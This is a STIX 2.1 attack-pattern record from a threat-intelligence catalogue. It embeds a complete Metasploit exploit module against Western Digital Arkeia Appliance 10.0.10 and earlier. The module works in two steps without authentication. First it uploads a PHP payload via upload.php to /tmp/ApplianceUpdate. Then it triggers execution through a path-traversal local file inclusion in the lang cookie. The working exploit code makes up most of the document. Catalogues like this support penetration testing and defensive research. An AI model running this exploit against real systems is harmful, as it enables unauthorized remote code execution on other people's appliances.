{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e6fff4d3-31a7-489c-adfe-06a281f5da99",
    "created": "2024-08-14T17:13:37.396439Z",
    "modified": "2024-08-14T17:13:37.396443Z",
    "name": "\"Western Digital Arkeia Remote Code Execution\"",
    "description": " This module exploits a vulnerability found in Western Digital Arkeia Appliance version 10.0.10 and lower. By abusing the upload.php script a malicious user can upload arbitrary code to the ApplianceUpdate file in the temp directory without authentication. Abusing the local file inclusion in the lang cookie to parse this file results in arbitrary code execution, also without authentication. The module has been tested successfully on Arkeia 10.0.10. The issues have been fixed in version 10.1.10.  'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/arkeia_upload_exec.rb",
            "external_id": "arkeia_upload_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Western Digital Arkeia Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Western Digital Arkeia Appliance\n        version 10.0.10 and lower. By abusing the upload.php script,\n        a malicious user can upload arbitrary code to the ApplianceUpdate file in the temp\n        directory without authentication. Abusing the local file inclusion in the lang\n        cookie to parse this file results in arbitrary code execution, also without\n        authentication. The module has been tested successfully on Arkeia 10.0.10. The issues\n        have been fixed in version 10.1.10.\n      },\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n         'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module\n        ],\n      'References'      =>\n        [\n          [ 'OSVDB', '97614' ],\n          [ 'OSVDB', '97615' ],\n          [ 'EDB', '28330' ]\n        ],\n      'Platform'        => ['php'],\n      'Arch'            => ARCH_PHP,\n      'Targets'         =>\n        [\n          ['Western Digital Arkeia Appliance 10.0.10', {}]\n        ],\n      'Privileged'      => false,\n      'DisclosureDate'  => '2013-09-16',\n      'DefaultTarget'   => 0))\n\n    register_options(\n      [\n       OptString.new('TARGETURI', [true, 'The base path to the Arkeia Appliance', '/'])\n      ])\n  end\n\n  def uri\n    return target_uri.path\n  end\n\n  def check\n    # Check version\n    print_status(\"Trying to detect installed version\")\n\n    res = send_request_cgi({\n     'method' => 'GET',\n     'uri'    => normalize_uri(uri)\n    })\n\n    if res and res.code == 200 and res.body =~ /v(\\d+\\.\\d+\\.\\d+)/\n      version = $1\n    else\n      return Exploit::CheckCode::Unknown\n    end\n\n    vprint_status(\"Version #{version} detected\")\n\n    if version > \"10.0.10\"\n      return Exploit::CheckCode::Safe\n    end\n\n    # Check for vulnerable component\n    vprint_status(\"Trying to detect the vulnerable component\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'Cookie' => \"lang=fr\" },\n      'uri'    => normalize_uri(uri)\n    })\n\n    if res and res.code == 200 and res.body =~ /Les versions brutes des messages est affichee ci-dessous/\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    payload_name = rand_text_alpha(rand(10) + 5)\n\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(payload.encoded, \"application/octet-stream\", nil, \"form-data; name=\\\"UPLOAD\\\"; filename=\\\"#{payload_name}\\\"\")\n    file = post_data.to_s\n    file.strip!\n\n    print_status(\"Sending PHP payload which will be uploaded to hardcoded /tmp/ApplianceUpdate\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, \"scripts\", \"upload.php\"),\n      'ctype'  => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'data'   => file\n    })\n\n    # If the server returns 200 we assume we uploaded the malicious\n    # file successfully\n    if not res or res.code != 200\n      fail_with(Failure::None, \"#{peer} - File wasn't uploaded, aborting!\")\n    end\n\n    register_files_for_cleanup(\"/tmp/ApplianceUpdate\")\n\n    print_status(\"Sending LFI payload to execute PHP code in /tmp/ApplianceUpdate\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'headers' => { 'Cookie' => \"lang=../../../../../../../../../../../../../../../../tmp/ApplianceUpdate%00en\" },\n      'uri'    => normalize_uri(uri)\n    })\n\n    # If we don't get a 200 when we request our malicious payload, we suspect\n    # we don't have a shell, either.\n    if res and res.code != 200\n      print_error(\"Unexpected response, probably the exploit failed\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-09-16",
    "x_mitre_platforms": [
        "['php']"
    ]
}